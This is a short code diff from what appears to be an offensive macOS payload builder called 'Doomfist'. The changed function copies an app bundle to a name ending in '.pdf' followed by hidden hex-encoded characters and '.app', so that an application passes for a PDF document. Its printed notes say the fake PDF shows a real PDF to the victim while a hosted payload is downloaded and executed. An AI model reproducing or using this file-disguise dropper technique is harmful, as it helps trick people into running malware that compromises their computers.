@@ -35,13 +35,11 @@ def pdf():
         shutil.copyfile(payload + "/applet.icns", payload + "/test.app/Contents/Resources/applet.icns")
         shutil.copyfile(payload + "/Info.plist", payload + "/test.app/Contents/Info.plist")
 
-        #os.system("cp -r Payloads/PDF_Payload/test.app Payloads/PDF_Payload/Doomfist.pdf..app")
-
         a = "Payloads/PDF_Payload/Doomfist.pdf" + bytes.fromhex('20').decode('utf-8') + bytes.fromhex('10').decode('utf-8') + ".app"
         shutil.copytree("Payloads/PDF_Payload/test.app", a)
         
 
-        print("[+] Built PDF as Doomfist.pdf.")
+        print("[+] Built 'PDF' application as Doomfist.pdf")
         print("Notes: \n"
               "1) The created pdf file downloads the legit pdf to open and present to the user  \n"
               "2) After which the hosted payload is downloaded and executed")
